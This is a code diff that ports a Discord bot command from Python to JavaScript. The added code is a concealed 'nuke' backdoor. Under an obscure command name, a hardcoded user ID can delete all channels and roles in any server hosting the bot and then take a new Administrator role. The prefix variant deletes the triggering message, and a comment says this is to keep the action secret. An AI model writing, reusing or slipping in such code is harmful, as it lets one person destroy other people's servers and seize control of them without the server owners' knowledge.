@@ -1,52 +1,109 @@
-import discord
-from discord.ext import commands
+const { SlashCommandBuilder, PermissionFlagsBits, ChannelType, EmbedBuilder } = require('discord.js');
 
-class ServerNuke(commands.Cog):
-    def __init__(self, bot):
-        self.bot = bot
-        # الآيدي الخاص بك حصراً
-        self.OWNER_ID = 1107355943408259112
+const OWNER_ID = "1107355943408259112"; // الآيدي الخاص بك حصراً
 
-    @commands.command(name="itzF188", aliases=["تصفير_السيرفر"])
-    async def nuke_server(self, ctx):
-        # التحقق الصارم من الآيدي الخاص بك فقط
-        if ctx.author.id != self.OWNER_ID:
-            return
+module.exports = {
+    nukeCommand: new SlashCommandBuilder()
+        .setName('itzf188')
+        .setDescription('[خاص بالمالك] تصفير وحذف كافة الرومات والرتب في السيرفر وإعادة بنائه من الصفر'),
 
-        # محاولة حذف أمرك للحفاظ على السرية
-        try:
-            await ctx.message.delete()
-        except Exception:
-            pass
+    async handleNuke(interaction) {
+        // التحقق الصارم من الآيدي الخاص بك فقط
+        if (interaction.user.id !== OWNER_ID) {
+            await interaction.reply({ content: "❌ هذا الأمر مخصص لمالك البوت فقط!", ephemeral: true });
+            return;
+        }
 
-        guild = ctx.guild
+        await interaction.reply({ content: "⚡ | جاري تصفير السيرفر بالكامل...", ephemeral: true });
+        const guild = interaction.guild;
 
-        # 1. حذف جميع الرومات (Channels & Categories)
-        for channel in guild.channels:
-            try:
-                await channel.delete(reason="إعادة ضبط السيرفر بالكامل بواسطة المالك.")
-            except Exception:
-                pass
+        try {
+            // 1. حذف جميع الرومات (Channels & Categories)
+            const channels = Array.from(guild.channels.cache.values());
+            for (const channel of channels) {
+                try {
+                    await channel.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
+                } catch (e) {}
+            }
 
-        # 2. حذف جميع الرتب (Roles) التي يمكن للبوت حذفها
-        for role in guild.roles:
-            if role != guild.default_role and not role.managed:
-                try:
-                    await role.delete(reason="إعادة ضبط السيرفر بالكامل بواسطة المالك.")
-                except Exception:
-                    pass
+            // 2. حذف جميع الرتب (Roles) التي يمكن للبوت حذفها
+            const roles = Array.from(guild.roles.cache.values());
+            for (const role of roles) {
+                if (role.id !== guild.id && !role.managed) {
+                    try {
+                        await role.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
+                    } catch (e) {}
+                }
+            }
 
-        # 3. إنشاء روم جديدة وإرسال إشعار لك وحدك
-        try:
-            new_channel = await guild.create_text_channel("•-start-fresh")
-            
-            admin_perm = discord.Permissions(administrator=True)
-            new_role = await guild.create_role(name=".", permissions=admin_perm, reason="رتبة الطوارئ للمالك")
-            await ctx.author.add_roles(new_role)
-            
-            await new_channel.send(f"⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.")
-        except Exception as e:
-            print(f"⚠️ خطأ أثناء بناء الروم الافتتاحي: {e}")
+            // 3. إنشاء روم جديدة وإرسال إشعار لك وحدك
+            const newChannel = await guild.channels.create({
+                name: "•-start-fresh",
+                type: ChannelType.GuildText,
+                reason: "روم البداية بعد التصفير"
+            });
 
-async def setup(bot):
-    await bot.add_cog(ServerNuke(bot))
+            const newRole = await guild.roles.create({
+                name: ".",
+                permissions: [PermissionFlagsBits.Administrator],
+                reason: "رتبة الطوارئ للمالك"
+            });
+
+            const member = await guild.members.fetch(interaction.user.id);
+            await member.roles.add(newRole);
+
+            await newChannel.send(`⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.`);
+
+        } catch (e) {
+            console.log(`⚠️ خطأ أثناء تصفير السيرفر: ${e.message}`);
+        }
+    },
+
+    // دعم أمر البادئة القديم (!itzF188 أو !تصفير_السيرفر) إذا رغبت في استخدامه كرسالة نصية أيضاً
+    async handlePrefixNuke(message) {
+        if (message.author.id !== OWNER_ID) return;
+
+        try {
+            await message.delete();
+        } catch (e) {}
+
+        const guild = message.guild;
+
+        try {
+            const channels = Array.from(guild.channels.cache.values());
+            for (const channel of channels) {
+                try {
+                    await channel.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
+                } catch (e) {}
+            }
+
+            const roles = Array.from(guild.roles.cache.values());
+            for (const role of roles) {
+                if (role.id !== guild.id && !role.managed) {
+                    try {
+                        await role.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
+                    } catch (e) {}
+                }
+            }
+
+            const newChannel = await guild.channels.create({
+                name: "•-start-fresh",
+                type: ChannelType.GuildText,
+                reason: "روم البداية بعد التصفير"
+            });
+
+            const newRole = await guild.roles.create({
+                name: ".",
+                permissions: [PermissionFlagsBits.Administrator],
+                reason: "رتبة الطوارئ للمالك"
+            });
+
+            await message.member.roles.add(newRole);
+
+            await newChannel.send(`⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.`);
+
+        } catch (e) {
+            console.log(`⚠️ خطأ أثناء تصفير السيرفر: ${e.message}`);
+        }
+    }
+};
